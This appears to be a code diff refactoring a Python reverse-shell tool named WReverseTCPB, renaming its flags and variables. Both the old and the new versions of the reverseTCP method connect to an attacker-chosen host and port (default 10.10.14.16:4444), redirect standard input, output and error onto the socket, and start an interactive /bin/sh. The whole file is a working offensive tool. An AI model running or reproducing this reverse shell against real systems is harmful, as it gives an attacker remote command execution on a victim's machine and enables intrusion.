@@ -16,61 +16,68 @@ class WReverseTCPB:
   VERSION = "1.0"
 
   USAGE = "Usage: python wrtcpb.py -lh 10.10.14.16 -lp 4444 -c /bin/sh"
-  FLAGS = ["-lh", "--lhost", "-lp", "--lport", "-s", "--shell", "-v", "--version", "-h", "--help"]
+  FLAGS = ["-lh", "--local-host", "-lp", "--local-port", "-s", "--shell", "-v", "--version", "-h", "--help"]
 
-  def __init__(self, lhost="10.10.14.16", lport=4444, shell="/bin/sh"):
-    self.lhost = lhost  #type: str
-    self.lport = lport  #type: int
+  def __init__(self, localHost="10.10.14.16", localPort=4444, shell="/bin/sh"):
+    self.localHost = localHost  #type: str
+    self.localPort = localPort  #type: int
     self.shell = shell  #type: str
 
   def checkArgs(self):  #type: (WReverseTCPB) -> None
-    if (len(sys.argv) == 1):
+    FLAGS = WReverseTCPB.FLAGS
+    sysArgs = sys.argv
+    if (len(sysArgs) == 1):
       return
 
-    if (sys.argv[1] == "--help" or sys.argv[1] == "-h"):
+    if (sysArgs[1] == FLAGS[8] or sysArgs[1] == FLAGS[9]):
       print(WReverseTCPB.USAGE)
       print("Optional arguments:")
-      print("  -lh  --host     : Specify your local ip address")
-      print("  -lp, --lport    : Specify your local port")
-      print("  -s,  --shell    : Specify the command to execute on successful reverse tcp.")
-      print("  -v,  --version  : Show version.")
-      print("  -h,  --help     : Show this help message")
+      print("  -lh  --local-host     : Specify your local ip address")
+      print("  -lp, --local-port     : Specify your local port")
+      print("  -s,  --shell          : Specify the command to execute on successful reverse tcp.")
+      print("  -v,  --version        : Show version.")
+      print("  -h,  --help           : Show this help message")
       exit()
 
-    if (sys.argv[1] == "--version" or sys.argv[1] == "-v"):
+    if (sysArgs[1] == FLAGS[6] or sysArgs[1] == FLAGS[7]):
       print("Reverse TCP version: {}".format(WReverseTCPB.VERSION))
       exit()
 
   def setArguments(self, flag, arg):  #type: (WReverseTCPB, str, str) -> None
-    flags = WReverseTCPB.FLAGS
+    FLAGS = WReverseTCPB.FLAGS
 
-    if (flag not in flags):
+    if (flag not in FLAGS):
       raise ValueError("Unknown flag " + flag)
 
-    if (flag == flags[0] or flag == flags[1]):
-      self.lhost = arg
-    elif (flag == flags[2] or flag == flags[3]):
-      self.lport = int(arg)
-    elif (flag == flags[4] or flag == flags[5]):
+    if (flag == FLAGS[0] or flag == FLAGS[1]):
+      self.localHost = arg
+    elif (flag == FLAGS[2] or flag == FLAGS[3]):
+      self.localPort = int(arg)
+    elif (flag == FLAGS[4] or flag == FLAGS[5]):
       self.shell = arg
 
   def iterateArguments(self):  #type: (WReverseTCPB) -> None
-    n = len(sys.argv)
-    if (n == 1):
+    sysArgs = sys.argv
+    sysArgsLength = len(sysArgs)
+    if (sysArgsLength == 1):
       return
-    for i in range(1, n):
-      if (i % 2 == 0):
+    for index in range(1, sysArgsLength):
+      if (index % 2 == 0):
         continue
-      self.setArguments(sys.argv[i], sys.argv[i + 1])
+      self.setArguments(sysArgs[index], sysArgs[index + 1])
 
   def reverseTCP(self):  #type: (WReverseTCPB) -> None
-    print("Initiating connection: {}:{} {}".format(self.lhost, self.lport, self.shell))
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((self.lhost, self.lport))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    subprocess.call([self.shell, "-i"])
+    localHost = self.localHost
+    localPort = self.localPort
+    shell = self.shell
+    print("Initiating connection: {}:{} {}".format(localHost, localPort, shell))
+
+    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    _socket.connect((localHost, localPort))
+    os.dup2(_socket.fileno(), 0)
+    os.dup2(_socket.fileno(), 1)
+    os.dup2(_socket.fileno(), 2)
+    subprocess.call([shell, "-i"])
 
 
 def __main__():  #type: () -> None
